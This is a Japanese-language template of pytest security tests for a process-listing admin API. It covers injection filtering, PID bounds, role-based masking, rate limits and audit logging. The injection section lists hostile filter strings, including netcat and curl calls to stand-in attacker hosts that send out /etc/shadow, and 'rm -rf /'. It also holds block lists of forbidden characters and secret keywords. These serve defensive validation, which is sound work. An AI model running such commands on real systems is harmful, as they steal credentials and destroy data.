# Running Processes モジュール - セキュリティテストケーステンプレート

**作成日**: 2026-02-06
**対象**: tests/security/test_processes_security.py
**目的**: セキュリティテストの実装ガイド

---

## 📋 テンプレート構成

このドキュメントは、@test-designer が Running Processes モジュールのセキュリティテストを実装する際のテンプレートです。

---

## 🧪 テストファイル構造

```python
"""
Running Processes モジュール - セキュリティテスト

CLAUDE.md のセキュリティ原則を検証
"""

import pytest
import re
from pathlib import Path
from typing import Any

# テストデータ
FORBIDDEN_CHARS = [";", "|", "&", "$", "(", ")", "`", ">", "<", "*", "?", "{", "}", "[", "]"]

PASSWORD_KEYWORDS = ["password", "passwd", "token", "key", "secret", "auth"]


class TestProcessesCommandInjection:
    """コマンドインジェクション防止テスト"""

    # 実装: セクション1


class TestProcessesPIDValidation:
    """PID バリデーションテスト"""

    # 実装: セクション2


class TestProcessesRBAC:
    """RBAC（ロールベースアクセス制御）テスト"""

    # 実装: セクション3


class TestProcessesRateLimit:
    """レート制限テスト"""

    # 実装: セクション4


class TestProcessesAuditLog:
    """監査ログテスト"""

    # 実装: セクション5


class TestProcessesSensitiveData:
    """機密情報保護テスト"""

    # 実装: セクション6


class TestProcessesSecurityPrinciples:
    """セキュリティ原則検証テスト（静的解析）"""

    # 実装: セクション7
```

---

## 📝 セクション1: コマンドインジェクション防止テスト

### 目的
フィルタ文字列に対するコマンドインジェクション攻撃を防止できることを検証

### テストケース

```python
class TestProcessesCommandInjection:
    """コマンドインジェクション防止テスト"""

    @pytest.mark.parametrize("malicious_filter", [
        # セミコロン（コマンド連結）
        "nginx; rm -rf /",
        "nginx; cat /etc/shadow",
        "nginx; whoami",

        # パイプ（コマンド連結）
        "nginx | nc attacker.com 1234",
        "nginx | base64 /etc/passwd",
        "nginx | curl http://evil.com -d @/etc/shadow",

        # アンパサンド（バックグラウンド実行）
        "nginx & whoami",
        "nginx && cat /etc/shadow",
        "nginx || ls -la /root",

        # コマンド置換
        "nginx $(cat /etc/passwd)",
        "nginx $(whoami)",
        "nginx `id`",
        "nginx `curl http://evil.com`",

        # リダイレクション
        "nginx > /tmp/hacked",
        "nginx >> /var/log/hacked",
        "nginx < /etc/passwd",
        "nginx 2>&1 | tee /tmp/output",

        # ワイルドカード
        "nginx*",
        "nginx?",

        # ブレース展開
        "nginx{1,2,3}",
        "nginx{a..z}",

        # 改行文字
        "nginx\nrm -rf /",
        "nginx\rwhoami",
    ])
    def test_reject_command_injection_in_filter(self, malicious_filter: str):
        """フィルタ文字列のコマンドインジェクションを拒否"""
        from backend.api.routes.processes import ProcessFilterRequest

        with pytest.raises(ValueError, match="Forbidden character|Invalid characters"):
            ProcessFilterRequest(filter=malicious_filter)

    @pytest.mark.parametrize("forbidden_char", FORBIDDEN_CHARS)
    def test_reject_each_forbidden_char(self, forbidden_char: str):
        """FORBIDDEN_CHARS の各文字を個別に検証"""
        from backend.api.routes.processes import ProcessFilterRequest

        malicious_filter = f"nginx{forbidden_char}ls"

        with pytest.raises(ValueError, match="Forbidden character"):
            ProcessFilterRequest(filter=malicious_filter)

    @pytest.mark.parametrize("safe_filter", [
        "nginx",
        "postgresql",
        "postgresql-12",
        "python3.9",
        "node_app",
        "redis-server",
        "my_app",
        "app.service",
    ])
    def test_accept_safe_filter(self, safe_filter: str):
        """安全なフィルタ文字列は許可"""
        from backend.api.routes.processes import ProcessFilterRequest

        request = ProcessFilterRequest(filter=safe_filter)
        assert request.filter == safe_filter

    def test_reject_too_long_filter(self):
        """フィルタ文字列が長すぎる場合は拒否"""
        from backend.api.routes.processes import ProcessFilterRequest

        long_filter = "a" * 101  # 100文字超過

        with pytest.raises(ValueError, match="max_length"):
            ProcessFilterRequest(filter=long_filter)

    def test_reject_empty_filter(self):
        """空文字列のフィルタは拒否（オプション）"""
        from backend.api.routes.processes import ProcessFilterRequest

        # 空文字列を許可するか、拒否するかは設計次第
        # 以下は拒否する場合の例
        with pytest.raises(ValueError, match="min_length"):
            ProcessFilterRequest(filter="")
```

---

## 📝 セクション2: PID バリデーションテスト

### 目的
PID の範囲・型・境界値が正しく検証されることを確認

### テストケース

```python
class TestProcessesPIDValidation:
    """PID バリデーションテスト"""

    @pytest.mark.parametrize("invalid_pid", [
        -1,         # 負の値
        0,          # ゼロ
        4194305,    # 最大値超過
        9999999,    # 大きすぎる値
    ])
    def test_reject_invalid_pid(self, invalid_pid: int):
        """無効な PID を拒否"""
        from backend.api.routes.processes import ProcessPIDRequest

        with pytest.raises(ValueError):
            ProcessPIDRequest(pid=invalid_pid)

    @pytest.mark.parametrize("valid_pid", [
        1,          # 最小値
        100,
        1000,
        65536,
        4194304,    # 最大値
    ])
    def test_accept_valid_pid(self, valid_pid: int):
        """有効な PID を許可"""
        from backend.api.routes.processes import ProcessPIDRequest

        request = ProcessPIDRequest(pid=valid_pid)
        assert request.pid == valid_pid

    def test_reject_non_integer_pid(self):
        """非整数の PID を拒否"""
        from backend.api.routes.processes import ProcessPIDRequest
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            ProcessPIDRequest(pid="abc")  # 文字列

        with pytest.raises(ValidationError):
            ProcessPIDRequest(pid=12.34)  # 浮動小数点

    def test_pid_boundary_values(self):
        """PID の境界値テスト"""
        from backend.api.routes.processes import ProcessPIDRequest

        # 最小値-1（拒否）
        with pytest.raises(ValueError):
            ProcessPIDRequest(pid=0)

        # 最小値（許可）
        request = ProcessPIDRequest(pid=1)
        assert request.pid == 1

        # 最大値（許可）
        request = ProcessPIDRequest(pid=4194304)
        assert request.pid == 4194304

        # 最大値+1（拒否）
        with pytest.raises(ValueError):
            ProcessPIDRequest(pid=4194305)
```

---

## 📝 セクション3: RBAC テスト

### 目的
ロール別のアクセス制御が正しく機能することを検証

### テストケース

```python
class TestProcessesRBAC:
    """RBAC（ロールベースアクセス制御）テスト"""

    def test_viewer_can_list_processes(self, test_client, viewer_headers):
        """Viewer はプロセス一覧を取得可能"""
        response = test_client.get("/api/processes", headers=viewer_headers)
        assert response.status_code == 200
        assert isinstance(response.json(), list)

    def test_viewer_cannot_see_environ(self, test_client, viewer_headers):
        """Viewer は環境変数フィールドを閲覧不可"""
        response = test_client.get("/api/processes/1", headers=viewer_headers)

        if response.status_code == 200:
            process = response.json()
            # environ フィールドが存在しない、または空
            assert "environ" not in process or process["environ"] is None

    def test_viewer_sees_masked_cmdline(self, test_client, viewer_headers):
        """Viewer はコマンドライン引数がマスクされる"""
        response = test_client.get("/api/processes/1", headers=viewer_headers)

        if response.status_code == 200:
            process = response.json()
            cmdline = process.get("cmdline", [])

            # パスワード含む引数がマスクされている
            for arg in cmdline:
                if any(kw in arg.lower() for kw in PASSWORD_KEYWORDS):
                    assert "***REDACTED***" in arg or arg == "***REDACTED***"

    def test_operator_can_list_processes(self, test_client, operator_headers):
        """Operator はプロセス一覧を取得可能"""
        response = test_client.get("/api/processes", headers=operator_headers)
        assert response.status_code == 200

    def test_operator_sees_masked_cmdline(self, test_client, operator_headers):
        """Operator もコマンドライン引数がマスクされる"""
        response = test_client.get("/api/processes/1", headers=operator_headers)

        if response.status_code == 200:
            process = response.json()
            cmdline = process.get("cmdline", [])

            # 機密情報はマスク
            for arg in cmdline:
                if any(kw in arg.lower() for kw in PASSWORD_KEYWORDS):
                    assert "***REDACTED***" in arg

    def test_admin_can_see_all_fields(self, test_client, admin_headers):
        """Admin は全フィールドを閲覧可能（マスクなし）"""
        response = test_client.get("/api/processes/1", headers=admin_headers)

        if response.status_code == 200:
            process = response.json()

            # 全フィールドが存在
            assert "cmdline" in process
            # environ の取得は設計次第（要確認）
            # assert "environ" in process

    def test_admin_sees_unmasked_cmdline(self, test_client, admin_headers):
        """Admin はマスクなしでコマンドライン引数を閲覧可能"""
        response = test_client.get("/api/processes/1", headers=admin_headers)

        if response.status_code == 200:
            process = response.json()
            cmdline = process.get("cmdline", [])

            # マスクされていない（REDACTED が含まれない）
            # ただし、実際のプロセスにパスワードがあるかは不確定
            # このテストは、マスクロジックがAdminに適用されないことを確認
            assert all("***REDACTED***" not in arg for arg in cmdline)
```

---

## 📝 セクション4: レート制限テスト

### 目的
API のレート制限が正しく機能することを検証

### テストケース

```python
class TestProcessesRateLimit:
    """レート制限テスト"""

    def test_rate_limit_processes_list(self, test_client, auth_headers):
        """プロセス一覧のレート制限（60 req/min）"""
        # 60回リクエスト
        for i in range(60):
            response = test_client.get("/api/processes", headers=auth_headers)
            assert response.status_code == 200, f"Request {i+1} failed"

        # 61回目で 429 エラー
        response = test_client.get("/api/processes", headers=auth_headers)
        assert response.status_code == 429
        assert "rate limit" in response.json()["detail"].lower()

    def test_rate_limit_processes_detail(self, test_client, auth_headers):
        """プロセス詳細のレート制限（120 req/min）"""
        # 120回リクエスト
        for i in range(120):
            response = test_client.get("/api/processes/1", headers=auth_headers)
            # 存在しないPIDでも200または404（レート制限には引っかからない）
            assert response.status_code in [200, 404], f"Request {i+1} failed"

        # 121回目で 429 エラー
        response = test_client.get("/api/processes/1", headers=auth_headers)
        assert response.status_code == 429

    def test_rate_limit_per_user(self, test_client, user1_headers, user2_headers):
        """レート制限はユーザー単位（独立）"""
        # user1 が 60回リクエスト
        for _ in range(60):
            test_client.get("/api/processes", headers=user1_headers)

        # user1 は制限に引っかかる
        response = test_client.get("/api/processes", headers=user1_headers)
        assert response.status_code == 429

        # user2 は影響なし
        response = test_client.get("/api/processes", headers=user2_headers)
        assert response.status_code == 200

    def test_rate_limit_reset_after_time(self, test_client, auth_headers):
        """レート制限は時間経過でリセット（オプション）"""
        import time

        # 60回リクエスト
        for _ in range(60):
            test_client.get("/api/processes", headers=auth_headers)

        # 61回目で 429
        response = test_client.get("/api/processes", headers=auth_headers)
        assert response.status_code == 429

        # 60秒待機
        time.sleep(61)

        # リセット後は再びリクエスト可能
        response = test_client.get("/api/processes", headers=auth_headers)
        assert response.status_code == 200
```

---

## 📝 セクション5: 監査ログテスト

### 目的
全操作が監査ログに記録されることを検証

### テストケース

```python
class TestProcessesAuditLog:
    """監査ログテスト"""

    def test_audit_log_on_process_list_success(self, test_client, auth_headers, audit_log):
        """プロセス一覧取得成功時の監査ログ記録"""
        response = test_client.get("/api/processes?filter=nginx", headers=auth_headers)
        assert response.status_code == 200

        # 監査ログ確認
        logs = audit_log.query(
            user_role="Admin",
            requesting_user_id="admin@example.com",
            operation="process_list",
            limit=1
        )

        assert len(logs) >= 1
        log_entry = logs[0]

        assert log_entry["operation"] == "process_list"
        assert log_entry["target"] == "all"
        assert log_entry["status"] == "success"
        assert log_entry["details"]["filter"] == "nginx"

    def test_audit_log_on_process_detail_success(self, test_client, auth_headers, audit_log):
        """プロセス詳細取得成功時の監査ログ記録"""
        response = test_client.get("/api/processes/1", headers=auth_headers)

        # 存在しないPIDでも監査ログは記録される
        logs = audit_log.query(
            user_role="Admin",
            requesting_user_id="admin@example.com",
            operation="process_detail",
            limit=1
        )

        assert len(logs) >= 1
        log_entry = logs[0]

        assert log_entry["operation"] == "process_detail"
        assert log_entry["target"] == "pid:1"

    def test_audit_log_on_validation_failure(self, test_client, auth_headers, audit_log):
        """入力検証失敗時の監査ログ記録"""
        # 不正なフィルタでリクエスト
        response = test_client.get("/api/processes?filter=nginx;ls", headers=auth_headers)
        assert response.status_code == 422  # Validation Error

        # 監査ログ確認
        logs = audit_log.query(
            user_role="Admin",
            requesting_user_id="admin@example.com",
            operation="process_list",
            status="failure",
            limit=1
        )

        assert len(logs) >= 1
        log_entry = logs[0]

        assert log_entry["status"] == "failure"
        assert "validation" in log_entry["details"].get("error", "").lower() or \
               "forbidden" in log_entry["details"].get("error", "").lower()

    def test_audit_log_includes_client_ip(self, test_client, auth_headers, audit_log):
        """監査ログにクライアントIPが記録される"""
        response = test_client.get("/api/processes", headers=auth_headers)
        assert response.status_code == 200

        logs = audit_log.query(
            user_role="Admin",
            requesting_user_id="admin@example.com",
            operation="process_list",
            limit=1
        )

        log_entry = logs[0]
        assert "client_ip" in log_entry["details"]
        # テストクライアントのIPは通常 "testclient"
        assert log_entry["details"]["client_ip"] is not None
```

---

## 📝 セクション6: 機密情報保護テスト

### 目的
機密情報が適切にマスクされることを検証

### テストケース

```python
class TestProcessesSensitiveData:
    """機密情報保護テスト"""

    def test_mask_password_in_cmdline(self):
        """コマンドライン引数のパスワードマスク"""
        from backend.api.routes.processes import mask_sensitive_cmdline

        cmdline = ["mysql", "-u", "root", "-pSecretPassword123"]
        masked = mask_sensitive_cmdline(cmdline, user_role="Viewer")

        # パスワード引数がマスクされている
        assert "SecretPassword123" not in str(masked)
        assert "***REDACTED***" in masked

    @pytest.mark.parametrize("password_arg", [
        "-pSecretPass",
        "--password=MySecret",
        "--db-password MySecret",
        "--token=ApiKey12345",
        "--auth-key=Secret",
        "--secret=TopSecret",
    ])
    def test_detect_password_keywords(self, password_arg: str):
        """パスワード関連キーワードの検出"""
        from backend.api.routes.processes import contains_password

        assert contains_password(password_arg) is True

    @pytest.mark.parametrize("safe_arg", [
        "-u", "root",
        "--host=localhost",
        "--port=3306",
        "nginx",
        "/usr/bin/python",
    ])
    def test_not_detect_safe_args(self, safe_arg: str):
        """安全な引数はマスクされない"""
        from backend.api.routes.processes import contains_password

        assert contains_password(safe_arg) is False

    def test_admin_sees_unmasked_data(self):
        """Admin はマスクされていないデータを閲覧可能"""
        from backend.api.routes.processes import mask_sensitive_cmdline

        cmdline = ["mysql", "-u", "root", "-pSecretPassword"]
        unmasked = mask_sensitive_cmdline(cmdline, user_role="Admin")

        # Admin はマスクなし
        assert "SecretPassword" in str(unmasked)
        assert "***REDACTED***" not in str(unmasked)

    def test_environ_excluded_for_viewer(self, test_client, viewer_headers):
        """Viewer には環境変数が返されない"""
        response = test_client.get("/api/processes/1", headers=viewer_headers)

        if response.status_code == 200:
            process = response.json()
            assert "environ" not in process or process["environ"] is None
```

---

## 📝 セクション7: セキュリティ原則検証テスト（静的解析）

### 目的
CLAUDE.md のセキュリティ原則が守られていることをコードレベルで検証

### テストケース

```python
class TestProcessesSecurityPrinciples:
    """セキュリティ原則検証テスト（静的解析）"""

    @pytest.fixture(scope="class")
    def project_root(self):
        """プロジェクトルート"""
        return Path(__file__).parent.parent.parent

    def test_no_shell_true_in_processes_module(self, project_root):
        """processes モジュールに shell=True が存在しないこと"""
        import subprocess

        processes_file = project_root / "backend/api/routes/processes.py"

        result = subprocess.run(
            ["grep", "-n", "shell=True", str(processes_file)],
            capture_output=True,
            text=True,
        )

        # 検出されない場合は returncode != 0
        assert result.returncode != 0, \
            f"shell=True detected in processes.py:\n{result.stdout}"

    def test_no_os_system_in_processes_module(self, project_root):
        """processes モジュールに os.system が存在しないこと"""
        import subprocess

        processes_file = project_root / "backend/api/routes/processes.py"

        result = subprocess.run(
            ["grep", "-En", r"os\.system\s*\(", str(processes_file)],
            capture_output=True,
            text=True,
        )

        assert result.returncode != 0, \
            f"os.system detected in processes.py:\n{result.stdout}"

    def test_no_eval_exec_in_processes_module(self, project_root):
        """processes モジュールに eval/exec が存在しないこと"""
        import subprocess

        processes_file = project_root / "backend/api/routes/processes.py"

        result = subprocess.run(
            ["grep", "-En", r"\b(eval|exec)\s*\(", str(processes_file)],
            capture_output=True,
            text=True,
        )

        assert result.returncode != 0, \
            f"eval/exec detected in processes.py:\n{result.stdout}"

    def test_wrapper_has_set_euo_pipefail(self, project_root):
        """ラッパースクリプトに set -euo pipefail が存在すること"""
        wrapper_file = project_root / "wrappers/adminui-processes.sh"

        if not wrapper_file.exists():
            pytest.skip("Wrapper script not yet implemented")

        content = wrapper_file.read_text()

        assert "set -euo pipefail" in content, \
            "adminui-processes.sh must have 'set -euo pipefail'"

    def test_wrapper_validates_special_chars(self, project_root):
        """ラッパースクリプトに特殊文字検証が存在すること"""
        wrapper_file = project_root / "wrappers/adminui-processes.sh"

        if not wrapper_file.exists():
            pytest.skip("Wrapper script not yet implemented")

        content = wrapper_file.read_text()

        # 特殊文字チェックの正規表現が存在
        assert "[';|&$(){}[]`<>*?]" in content or \
               "[;|&$(){}[]`<>*?]" in content, \
            "Wrapper must validate forbidden characters"

    def test_no_bash_c_in_wrapper(self, project_root):
        """ラッパースクリプトに bash -c が存在しないこと"""
        import subprocess

        wrapper_file = project_root / "wrappers/adminui-processes.sh"

        if not wrapper_file.exists():
            pytest.skip("Wrapper script not yet implemented")

        result = subprocess.run(
            ["grep", "-n", "bash -c", str(wrapper_file)],
            capture_output=True,
            text=True,
        )

        assert result.returncode != 0, \
            f"bash -c detected in adminui-processes.sh:\n{result.stdout}"
```

---

## 📊 テストカバレッジ目標

### 最小要件

- **コマンドインジェクション**: 15+ テストケース ✅
- **PID バリデーション**: 8+ テストケース ✅
- **RBAC**: 8+ テストケース ✅
- **レート制限**: 4+ テストケース ✅
- **監査ログ**: 4+ テストケース ✅
- **機密情報保護**: 6+ テストケース ✅
- **セキュリティ原則**: 6+ テストケース ✅

**合計**: 50+ テストケース

### カバレッジ目標

```bash
pytest tests/security/test_processes_security.py --cov=backend/api/routes/processes --cov-report=html

# 目標: 90%以上のカバレッジ
```

---

## 🚀 実装ガイドライン

### Step 1: テストファイル作成

```bash
touch tests/security/test_processes_security.py
```

### Step 2: 依存関係インストール

```bash
pip install pytest pytest-cov pytest-mock
```

### Step 3: テスト実装

上記のテンプレートをコピー&ペーストし、必要に応じてカスタマイズ

### Step 4: テスト実行

```bash
# 全テスト実行
pytest tests/security/test_processes_security.py -v

# カバレッジ付き
pytest tests/security/test_processes_security.py --cov=backend/api/routes/processes --cov-report=html

# 特定のクラスのみ
pytest tests/security/test_processes_security.py::TestProcessesCommandInjection -v
```

### Step 5: カバレッジ確認

```bash
# HTML レポート確認
open htmlcov/index.html
```

---

## ✅ 完了基準

- [ ] 全テストケース実装（50+）
- [ ] 全テストが PASS
- [ ] カバレッジ 90%+ 達成
- [ ] security-checker によるレビュー完了

---

**最終更新**: 2026-02-06
